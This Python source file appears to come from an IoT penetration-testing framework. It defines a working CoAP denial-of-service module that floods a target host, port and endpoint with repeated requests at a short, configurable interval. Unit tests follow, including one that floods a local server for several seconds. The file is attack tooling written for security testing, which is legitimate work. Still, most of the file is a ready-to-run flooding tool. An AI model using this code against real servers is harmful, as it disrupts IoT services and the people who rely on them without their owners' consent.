import logging
import multiprocessing
import signal
import time
import unittest

from coapthon.client.helperclient import HelperClient

from Entity.attack import Attack
from Entity.input_format import InputFormat
from protocols import CoAP as PeniotCoAP


class CoAPDoSAttack(Attack):
    """
    CoAP Protocol - DoS Attack Module
    It is created to penetrate CoAP server with tiny interval messages by sending again and again messages
    """
    client = None

    # Input Fields
    host = None
    port = None
    path = None
    method = None
    method_string = PeniotCoAP.get_coap_methods_as_string(PeniotCoAP.CoAPMethods.GET)
    payload = None
    timeout = 0.01

    # Miscellaneous Members
    logger = None
    sent_message_count = 0  # Transmitted fuzzing packets
    stopped_flag = False

    def __init__(self):
        default_parameters = ["", "", "", "", "", 10.0]
        inputs = [
            InputFormat("Host Name", "host", "", str, mandatory=True),
            InputFormat("Port Number", "port", "", int, mandatory=True),
            InputFormat("Endpoint", "path", "", str, mandatory=True),
            InputFormat("Method", "method_string", self.method_string, str, mandatory=True),
            InputFormat("Payload", "payload", "", str, mandatory=True),
            InputFormat("Timeout", "timeout", self.timeout, float)
        ]

        Attack.__init__(self, "CoAP DoS Attack", inputs, default_parameters,
                        "    We send CoAP requests to the client.\n"
                        "    The time difference between those requests\n"
                        "    can be specified.")

        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s:%(levelname)s:%(name)s:%(message)s")

        # Signal handler to exit from function
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        self.stop_attack()

    def stop_attack(self):
        self.logger.info("Sent message count: {0}, exitting...".format(self.sent_message_count))
        self.stopped_flag = True
        if self.client is not None:
            self.client.stop()
        time.sleep(2)  # Sleep two seconds so the user can see the message

    def pre_attack_init(self):
        self.client = HelperClient(server=(self.host, self.port))
        self.method = PeniotCoAP.get_coap_methods_by_name(self.method_string)

    def run(self):
        super(CoAPDoSAttack, self).run()
        self.pre_attack_init()

        # Start client loop for requests
        while self.stopped_flag is False:
            self.sent_message_count += 1
            response = PeniotCoAP.make_request(self.client, self.path, self.method, self.payload)
            self.logger.info("Received message = {0}".format(str(response.line_print)))
            time.sleep(self.timeout)


class TestCoAPDoSAttack(unittest.TestCase):
    def setUp(self):
        self.coap_dos_attack = CoAPDoSAttack()

    def tearDown(self):
        pass

    def test_name(self):
        self.assertEqual("CoAP DoS Attack", self.coap_dos_attack.get_attack_name())

    def test_inputs(self):
        inputs = self.coap_dos_attack.get_inputs()
        self.assertIsNotNone(inputs)
        self.assertGreater(len(inputs), 0, "Non inserted inputs")
        self.assertEquals(len(inputs), 6)

    def test_non_initialized_inputs(self):
        inputs = self.coap_dos_attack.get_inputs()
        for _input in inputs:
            value = getattr(self.coap_dos_attack, _input.get_name())
            self.assertTrue(value is None or type(value) == _input.get_type())

    def test_after_getting_inputs(self):
        example_inputs = ["a.b.c.d", 8888, "peniot-coap-test", "pOst", "peniot", 13.2]
        for index, _input in enumerate(example_inputs):
            self.coap_dos_attack.inputs[index].set_value(_input)

        # Previously it should not be set
        self.assertIsNone(self.coap_dos_attack.client)

        super(CoAPDoSAttack, self.coap_dos_attack).run()

        inputs = self.coap_dos_attack.get_inputs()
        for index, _input in enumerate(inputs):
            value = getattr(self.coap_dos_attack, _input.get_name())
            self.assertEqual(example_inputs[index], value)

    def test_dos_attack(self):
        def run_attack():
            example_inputs = ["127.0.0.1", 5683, "peniot", "get", "peniot", 0.01]
            for index, _input in enumerate(example_inputs):
                self.coap_dos_attack.inputs[index].set_value(_input)

            self.coap_dos_attack.run()

        print "* If server is not initialized this test will not execute properly."
        p = multiprocessing.Process(target=run_attack, name="DoS Attack")
        p.start()
        time.sleep(5)
        if p.is_alive():
            p.terminate()
            p.join()


if __name__ == '__main__':
    unittest.main()
